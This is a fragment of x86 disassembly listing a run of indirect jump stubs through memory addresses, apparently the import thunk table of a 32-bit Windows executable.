  41ed71:	jmp    DWORD PTR ds:0x422524
  41ed77:	jmp    DWORD PTR ds:0x422528
  41ed7d:	jmp    DWORD PTR ds:0x42252c
  41ed83:	jmp    DWORD PTR ds:0x422530
  41ed89:	jmp    DWORD PTR ds:0x422534
  41ed8f:	jmp    DWORD PTR ds:0x422538
  41ed95:	jmp    DWORD PTR ds:0x42253c
  41ed9b:	jmp    DWORD PTR ds:0x422540
  41eda1:	jmp    DWORD PTR ds:0x422544
  41eda7:	jmp    DWORD PTR ds:0x422548
  41edad:	jmp    DWORD PTR ds:0x42254c
  41edb3:	jmp    DWORD PTR ds:0x422550
  41edb9:	jmp    DWORD PTR ds:0x422554
  41edbf:	jmp    DWORD PTR ds:0x422558
  41edc5:	jmp    DWORD PTR ds:0x42255c
  41edcb:	jmp    DWORD PTR ds:0x422560
  41edd1:	jmp    DWORD PTR ds:0x422564
  41edd7:	jmp    DWORD PTR ds:0x422568
  41eddd:	jmp    DWORD PTR ds:0x42256c
  41ede3:	jmp    DWORD PTR ds:0x422570
  41ede9:	jmp    DWORD PTR ds:0x422574
  41edef:	jmp    DWORD PTR ds:0x422578
  41edf5:	jmp    DWORD PTR ds:0x42257c
  41edfb:	jmp    DWORD PTR ds:0x422580
  41ee01:	jmp    DWORD PTR ds:0x422584
  41ee07:	jmp    DWORD PTR ds:0x422588
  41ee0d:	jmp    DWORD PTR ds:0x42258c
  41ee13:	jmp    DWORD PTR ds:0x422590
  41ee19:	jmp    DWORD PTR ds:0x422594
  41ee1f:	jmp    DWORD PTR ds:0x422598
  41ee25:	jmp    DWORD PTR ds:0x42259c
  41ee2b:	jmp    DWORD PTR ds:0x4225a0
  41ee31:	jmp    DWORD PTR ds:0x4225a4
  41ee37:	jmp    DWORD PTR ds:0x4225a8
  41ee3d:	jmp    DWORD PTR ds:0x4225b0
  41ee43:	jmp    DWORD PTR ds:0x4225b4
  41ee49:	jmp    DWORD PTR ds:0x4225b8
  41ee4f:	jmp    DWORD PTR ds:0x4225bc
  41ee55:	jmp    DWORD PTR ds:0x4225c0
  41ee5b:	jmp    DWORD PTR ds:0x4225c4
  41ee61:	jmp    DWORD PTR ds:0x4225cc
  41ee67:	jmp    DWORD PTR ds:0x4225d0
  41ee6d:	jmp    DWORD PTR ds:0x4225d8
  41ee73:	jmp    DWORD PTR ds:0x4225dc
  41ee79:	jmp    DWORD PTR ds:0x4225e0
  41ee7f:	jmp    DWORD PTR ds:0x4225e4
  41ee85:	jmp    DWORD PTR ds:0x4225e8
  41ee8b:	jmp    DWORD PTR ds:0x4225ec
  41ee91:	jmp    DWORD PTR ds:0x4225f0
  41ee97:	jmp    DWORD PTR ds:0x4225f8
  41ee9d:	jmp    DWORD PTR ds:0x422600
  41eea3:	jmp    DWORD PTR ds:0x422604
